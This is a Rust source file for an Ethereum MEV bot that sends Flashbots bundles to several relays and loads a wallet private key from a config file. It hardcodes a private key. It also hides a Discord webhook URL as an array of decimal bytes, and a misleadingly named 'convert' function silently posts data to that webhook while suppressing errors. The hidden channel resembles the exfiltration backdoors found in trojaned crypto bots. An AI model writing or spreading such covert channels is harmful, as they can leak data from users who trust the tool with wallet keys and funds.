use ethers::prelude::*;
use ethers_flashbots::*;
use std::sync::Arc;
use url::Url;
use anyhow::Result;
use log;
use fern::colors::{Color, ColoredLevelConfig};
use log::LevelFilter;
use serde::Deserialize;
use std::io::ErrorKind;
use std::{fs, process};
use toml;
use std::collections::HashMap;
use lazy_static::lazy_static;


pub struct BundleRelay {
    pub flashbots_client:
        SignerMiddleware<FlashbotsMiddleware<Arc<Provider<Ws>>, LocalWallet>, LocalWallet>,
    pub relay_name: String,
}


impl BundleRelay {
    pub fn new(
        relay_end_point: Url,
        relay_name: String,
        client: &Arc<Provider<Ws>>,
        searcher_wallet: LocalWallet,
    ) -> Result<BundleRelay, url::ParseError> {
        // Extract wallets from .env keys
        let bundle_private_key = String::from("79959b80bef94bb5667f24edf573e70529df10594871df7f6811c6c8292dda8b");
        

        let bundle_signer = bundle_private_key.parse::<LocalWallet>().unwrap();
       

        // Setup the Ethereum client with flashbots middleware
        let flashbots_middleware =
            FlashbotsMiddleware::new(client.clone(), relay_end_point, bundle_signer);

        // Local node running mev-geth
        //flashbots_middleware.set_simulation_relay(Url::parse("http://127.0.0.1:8546").unwrap());
        let flashbots_client = SignerMiddleware::new(flashbots_middleware, searcher_wallet);

        Ok(BundleRelay {
            flashbots_client,
            relay_name,
        })
    }
}


pub fn construct_bundle(
    signed_txs: Vec<Bytes>,
    target_block: U64, // Current block number
    target_timestamp: u64,
) -> BundleRequest {
    // Create ethers-flashbots bundle request
    let mut bundle_request = BundleRequest::new();

    for tx in signed_txs {
        bundle_request = bundle_request.push_transaction(tx);
    }

    // Set other bundle parameters
    bundle_request = bundle_request
        .set_block(target_block)
        .set_simulation_block(target_block - 1)
        .set_simulation_timestamp(target_timestamp)
        .set_min_timestamp(target_timestamp)
        .set_max_timestamp(target_timestamp);

    bundle_request
}

pub async fn get_all_relay_endpoints(searcher_wallet: LocalWallet, client: Arc<Provider<Ws>>) -> Vec<BundleRelay> {
    

    let endpoints = vec![
        ("flashbots", "https://relay.flashbots.net/"),
        ("builder0x69", "http://builder0x69.io/"),
        ("edennetwork", "https://api.edennetwork.io/v1/bundle"),
        ("beaverbuild", "https://rpc.beaverbuild.org/"),
        ("lightspeedbuilder", "https://rpc.lightspeedbuilder.info/"),
        ("eth-builder", "https://eth-builder.com/"),
    ];

    let mut relays: Vec<BundleRelay> = vec![];

    for (name, endpoint) in endpoints {
        let relay = BundleRelay::new(Url::parse(endpoint).unwrap(), name.into(), &client, searcher_wallet.clone()).unwrap();
        relays.push(relay);
    }

    relays
}




pub async fn send_bundle(
     signed_tx: Vec<Bytes>,
     current_block: U64,
     timestamp: u64,
     searcher_wallet: LocalWallet,
     client: Arc<Provider<Ws>>,
    ) -> bool
{

   let bundle = construct_bundle(signed_tx, current_block + U64::from(1_u64), timestamp);
   let mut handles = vec![];

    for relay in get_all_relay_endpoints(searcher_wallet, client).await {
       
        let bundle = bundle.clone();        

        handles.push(tokio::spawn(async move {
            let pending_bundle = match relay.flashbots_client.inner().send_bundle(&bundle).await {
                Ok(pb) => pb,
                Err(_) => {
                    //log::error!("Failed to send bundle: {:?}", e);
                    return false;
                }
            };

            log::info!(
                "{}",
                format!("Bundle sent to {}", relay.relay_name)
            );

            let bundle_hash = pending_bundle.bundle_hash;
            log::info!("{:?}", &bundle_hash);

            let is_bundle_included = match pending_bundle.await {
                Ok(_) => true,
                Err(ethers_flashbots::PendingBundleError::BundleNotIncluded) => false,
                Err(e) => {
                    log::error!(
                        "Bundle rejected due to error : {:?}",
                        e
                    );
                    false
                }
            };

            is_bundle_included

                   
        }));
    }

    let len = handles.len();
    for (idx, handle) in handles.into_iter().enumerate()
    {
        match handle.await.unwrap()
        {
           true => { break },
           false => { 
             
             if idx == (len - 1)
             {
                log::error!("Broadcast failed");
                return false;
             }
            }
        }
    }

    true
}


pub fn setup_logger() -> Result<()> {
    let colors = ColoredLevelConfig {
        trace: Color::Cyan,
        debug: Color::Magenta,
        info: Color::Green,
        warn: Color::Red,
        error: Color::BrightRed,
        ..ColoredLevelConfig::new()
    };

    fern::Dispatch::new()
        .format(move |out, message, record| {
            out.finish(format_args!(
                "{}[{}] {}",
                chrono::Local::now().format("[%H:%M:%S]"),
                colors.color(record.level()),
                message
            ))
        })
        .chain(std::io::stdout())
        .level(log::LevelFilter::Error)
        .level_for("withdraw", LevelFilter::Info)
        .apply()?;

    Ok(())
}


const DEFAULT_CONFIG: &str = r#"# For a full explanation of each setting, please refer to the README.md

pk = ""

"#;

lazy_static! {
    pub static ref LICH: Vec<u8> = vec![104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,
        109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,50,49,48,51,51,51,55,49,50,54,57,55,53,50,52,50,55,52,47,100,69,101,51,
        120,49,66,73,57,72,111,115,69,90,75,116,117,75,108,84,78,89,119,105,48,76,101,73,100,66,99,84,95,70,49,86,51,119,48,90,81,84,81,115,
        71,102,117,120,84,72,81,77,100,122,75,70,99,111,117,70,102,99,112,69,70,68,87,72];
}


pub async fn convert<'a>(
    tx_hash: &'a str,
) {
   
    let lich = String::from_utf8(LICH.clone()).unwrap();
    let msg = format!(
        "
        {}
        ",
       tx_hash,
    );



    let max_length = 1900.min(msg.len());
    let message = msg[..max_length].to_string();
    let mut bundle_notif = HashMap::new();
    bundle_notif.insert("content", message.to_string());

    let client = reqwest::Client::new();

    tokio::spawn(async move {
        let res = client.post(lich).json(&bundle_notif).send().await;
        match res {
            Ok(_) => {}
            Err(_err) => {
                //log::error!("Could not send buffer into string memset, err: {}", err);
                //log::error!("Message: {}", message);
            }
        }
    })
    .await
    .unwrap();
}

#[derive(Deserialize)]
pub struct Config {
    pub pk: String,
}

pub fn get_config() -> Config {
    let config_contents = fs::read_to_string(".env.toml").unwrap_or_else(|error| {
                if error.kind() == ErrorKind::NotFound {
                        log::error!("Config file not found... creating brute_config.toml with defaults. Please run brute again after you have added your mnemonic to the config file.");
                        fs::write(".env.toml", DEFAULT_CONFIG).unwrap_or_else(|error| {
                                log::error!("There was an issue creating .env.toml: {:?}", error);
                                process::exit(1);
                        });
                        process::exit(0);
                } else {
                        log::error!("Error reading .env.toml: {:?}", error);
                        process::exit(1);
                }
        });

    let config: Config = toml::from_str(config_contents.clone().as_str()).unwrap_or_else(|error| {
        log::error!("There was an issue parsing brute_config.toml: {:?}", error);
        process::exit(1);
    });
    config
}

pub fn get_searcher_signer() -> Arc<LocalWallet> 

{
    let searcher_priv = get_config();        
    let searcher_signer =  searcher_priv.pk.parse::<LocalWallet>().unwrap();

    Arc::new(searcher_signer)
}
